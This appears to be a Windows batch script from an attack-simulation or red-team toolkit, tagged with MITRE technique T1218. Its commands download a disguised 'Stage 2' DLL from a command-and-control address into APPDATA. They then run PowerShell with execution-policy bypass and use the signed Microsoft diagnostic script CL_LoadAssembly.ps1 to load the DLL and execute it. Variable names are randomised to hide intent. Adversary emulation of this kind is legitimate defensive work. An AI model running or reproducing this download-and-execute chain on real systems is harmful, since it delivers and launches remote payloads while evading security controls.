@echo off
setlocal enabledelayedexpansion

REM Cache timestamp for debug logging
SET tsvar=!DATE!/!TIME!

REM Placeholder constant declarations (random-named SET vars, one per PHR_*)
SET a1B2c3D4=%APPDATA%\11989\13fbffee
SET e5F6g7H8=53e6896b.txt
SET i9J0k1L2=https://10.0.0.49/stage/2/icon.png?11989-7
SET m3N4o5P6=ITZEL-S2B
SET q7R8s9T0=11989
SET u1V2w3X4=7
SET y5Z6a7B8=%PUBLIC%\\macula-simulations.log
SET c9D0e1F2=https://10.0.0.49

REM Debug log: script start
echo [!tsvar!][DEBUG][!m3N4o5P6!][!q7R8s9T0!]: script_start>> "!y5Z6a7B8!" 2>nul

REM Step 1: Heartbeat fetch - download Stage 2 Loader DLL from C2
echo [!tsvar!][DEBUG][!m3N4o5P6!][!q7R8s9T0!]: heartbeat_start>> "!y5Z6a7B8!" 2>nul
curl -k -s -o "!a1B2c3D4!\!e5F6g7H8!" "!i9J0k1L2!"
set hb_err=!errorlevel!
echo [!tsvar!][DEBUG][!m3N4o5P6!][!q7R8s9T0!]: heartbeat_complete>> "!y5Z6a7B8!" 2>nul

REM Step 2: Position working directory
echo [!tsvar!][DEBUG][!m3N4o5P6!][!q7R8s9T0!]: chdir_start>> "!y5Z6a7B8!" 2>nul
cd /d "!a1B2c3D4!" >nul 2>&1
set chdir_err=!errorlevel!
echo [!tsvar!][DEBUG][!m3N4o5P6!][!q7R8s9T0!]: chdir_result=!chdir_err!>> "!y5Z6a7B8!" 2>nul

REM Step 3: Invoke Stage 2 DLL via PowerShell (LOLBIN)
echo [!tsvar!][DEBUG][!m3N4o5P6!][!q7R8s9T0!]: powershell_start>> "!y5Z6a7B8!" 2>nul
powershell.exe -ep bypass -command "set-location -path c:\windows\diagnostics\system\networking; import-module .\CL_LoadAssembly.ps1; $n=[AppDomain]::CurrentDomain.GetAssemblies().Count; LoadAssemblyFromPath %APPDATA%\11989\13fbffee\53e6896b.txt; $asm=([AppDomain]::CurrentDomain.GetAssemblies() | Select-Object -Skip $n -First 1); ($asm.GetExportedTypes() | ForEach-Object { $_.GetMethods([Reflection.BindingFlags]'Public,Static') | Where-Object { $_.GetParameters().Count -eq 0 } } | Select-Object -First 1).Invoke($null,$null)"
set ps_err=!errorlevel!
echo [!tsvar!][DEBUG][!m3N4o5P6!][!q7R8s9T0!]: powershell_end=!ps_err!>> "!y5Z6a7B8!" 2>nul

REM Logging: TTP line
for /f "delims=" %%t in ('powershell -nop -c "Get-Date -Format 'yyyy-MM-dd HH:mm:ss.fff'"') do set timestamp=%%t
if !ps_err! equ 0 (
    echo [!timestamp!][TTP][!m3N4o5P6!][!q7R8s9T0!]: T1218^|System Binary Proxy Execution=OK=>> "!y5Z6a7B8!" 2>&1
) else (
    echo [!timestamp!][TTP][!m3N4o5P6!][!q7R8s9T0!]: T1218^|System Binary Proxy Execution=FAIL:exitcode=!ps_err!>> "!y5Z6a7B8!" 2>&1
)

endlocal